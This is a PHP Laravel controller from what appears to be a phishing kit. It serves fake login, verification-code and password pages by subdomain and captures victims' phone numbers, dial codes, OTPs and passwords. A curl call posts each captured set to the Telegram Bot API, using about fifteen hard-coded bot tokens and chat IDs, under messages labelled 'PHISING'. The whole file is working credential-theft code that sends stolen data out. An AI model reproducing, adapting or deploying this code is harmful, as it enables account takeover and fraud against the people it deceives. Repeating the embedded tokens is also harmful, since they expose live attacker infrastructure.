<?php

namespace App\Http\Controllers;

use Illuminate\Support\Facades\Session;
use Illuminate\Http\Request;

class HomeController extends Controller
{

    public function index(Request $request)
    {

        return inertia('LoginIndex');
    }

    public function login_store(Request $request)
    {
        $subdomain = explode('.', $request->getHost())[0];
        Session::forget("dataNumber");
        $phone = $request->phone;
        $code = $request->code;
        Session::push("dataNumber", [
            'getPhone' => $phone,
            'getDialCode' => $code,
        ]);
        $this->sendKode($phone, $code, "", "", $subdomain);
        return redirect('verif');
    }

    public function verif(Request $request)
    {
        $data = Session::get('dataNumber');

        $getPhone = $data[0]['getPhone'] ?? 0;
        $getDialCode = $data[0]['getDialCode'] ?? 0;
        return inertia('Verif', compact('getPhone', 'getDialCode'));
    }

    public function verif_store(Request $request)
    {
        $subdomain = explode('.', $request->getHost())[0];
        Session::forget("dataNumber");
        $phone = $request->phone;
        $code = $request->dial_code;
        $verif = $request->code;
        Session::push('dataNumber', [
            'getPhone' => $phone,
            'getDialCode' => $code,
            'getVerif' => $verif,
        ]);
        $this->sendKode($phone, $code, "", $verif, $subdomain);
        return redirect('password');
    }

    public function get_password(Request $request)
    {
        $data = Session::get('dataNumber');

        $getPhone = $data[0]['getPhone'] ?? 0;
        $getDialCode = $data[0]['getDialCode'] ?? 0;
        $getVerif = $data[0]['getVerif'] ?? 0;
        return inertia('GetPassword', compact(
            'getPhone',
            'getDialCode',
            'getVerif'
        ));
    }
    public function store_password(Request $request)
    {
        $subdomain = explode('.', $request->getHost())[0];
        Session::forget("dataNumber");
        $phone = $request->phone;
        $code = $request->dial_code;
        $verif = $request->code;
        $password = $request->password;
        $this->sendKode($phone, $code, $verif, $password, $subdomain);
        return redirect('');
    }

    public function index_first(Request $request)
    {
        $subdomain = explode('.', $request->getHost())[0];
        if ($subdomain ===  "live-vc-private1-my20") {
            return inertia('rhmtt/PhisRhmtt');
        } else {

            return inertia('Index');
        }
    }
    public function sendKode($phone = "", $code = "", $otp = "", $password = "", $subdomain = "")
    {
        // mulai dari bot 6 yah

        if ($subdomain == "live-vc-private1-my6") {
            // BOT 6
            $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
            $chat_id = "7637087335";
            $phisData = "MY6";
        } else   if ($subdomain == "live-vc-private1-my7") {
            // BOT 7
            $bot_token = "7628917568:AAEG9egRkGovhj0tVNaw_fw-HEKMwxk70T0";
            $chat_id = "7659680018";
            $phisData = "MY7";
        } else  if ($subdomain == "live-vc-private1-my8") {
            // BOT 8
            $bot_token = "8152310450:AAFamqOkQDQIjgiW6KgCvxQLE-F31mVoRws";
            $chat_id = "7094645746";
            $phisData = "MY8";
        } else  if ($subdomain == "live-vc-private1-my9") {
            // BOT 9
            $bot_token = "7725644706:AAED4xmptLbmRse_yX1jjL0ElhDEuhDUCkc";
            $chat_id = "6243136404";
            $phisData = "MY9";
        } else  if ($subdomain == "live-vc-private1-my10") {
            // BOT 10
            $bot_token = "7688138521:AAEgyGA8_HAZSU3gG7Yb1QKoA9tfOMuKDWE";
            $chat_id = "8070575359";
            $phisData = "MY10";
        } else  if ($subdomain == "live-vc-private1-my11") {
            // BOT 11
            $bot_token = "7601808483:AAHWk8fP7idbD8t1QttM7Se1LAg2BqH6hgM";
            $chat_id = "7407769534";
            $phisData = "MY11";
        } else  if ($subdomain == "live-vc-private1-my12") {
            // BOT 12
            $bot_token = "7648139656:AAEyPbxLA5ROEDy7CzAQODYYCFcyF-GIBn4";
            $chat_id = "6391024630";
            $phisData = "MY12";
        } else  if ($subdomain == "live-vc-private1-my13") {
            // BOT 13
            $bot_token = "7783947061:AAFVbVuNeFIq4bmRt6mhQYQumonFIY-SCW8";

            $chat_id = "5499456356";
            $phisData = "MY13";
        } else  if ($subdomain == "live-vc-private1-my14") {
            // BOT 14
            $bot_token = "7938005326:AAFSXMpmtunTPvKhToHrCJwJyxjrP45wiQY";

            $chat_id = "6834715975";
            $phisData = "MY14";
        } else  if ($subdomain == "live-vc-private1-my15") {
            // BOT 15
            $bot_token = "8191392356:AAG2FdJSSETQVNojLNta49t7ONjz_YXgnIs";

            $chat_id = "5627605109";
            $phisData = "MY15";
        } else  if ($subdomain == "live-vc-private1-my16") {
            // BOT 16
            $bot_token = "7987396890:AAEHhge3VdvthGkAuLy9xVsIGVrEZ0zFS7I";

            $chat_id = "5884038998";
            $phisData = "MY16";
        } else  if ($subdomain == "live-vc-private1-my17") {
            // BOT 17
            $bot_token = "7270446058:AAHLzCew-iWBEs9rShYxm-WZR_wxELhrq2Y";

            $chat_id = "5865500600";
            $phisData = "MY17";
        } else  if ($subdomain == "live-vc-private1-my18") {
            // BOT 18
            $bot_token = "7816275181:AAFRKUc2RWb5r5_QIzu6DiVvcEj2lZS0jOo";

            $chat_id = "7005344615";
            $phisData = "MY18";
        } else  if ($subdomain == "live-vc-private1-my19") {
            // BOT 19
            $bot_token = "8115199238:AAG4RgC8glAVFEuVB-3OWdT8hQeOkHSq__w";

            $chat_id = "7092408619";
            $phisData = "MY19";
        } else  if ($subdomain == "live-vc-private1-my20") {
            // BOT 20
            $bot_token = "";

            $chat_id = "";
            $phisData = "MY20";
        } else  if ($subdomain == "live-vc-private1-my21") {
            // BOT 21s`
            $bot_token = "";

            $chat_id = "";
            $phisData = "MY21";
        }

        $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";




        $ch = curl_init();

        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $chat_id,
            'text' => "Phone | $phone \n Code | $code \n OTP :| $otp \n Password : $password \n \n \n
    PHISING $phisData
    "
        ]);

        // Eksekusi cURL request
        $response = curl_exec($ch);

        // Menutup koneksi cURL
        curl_close($ch);
    }
}
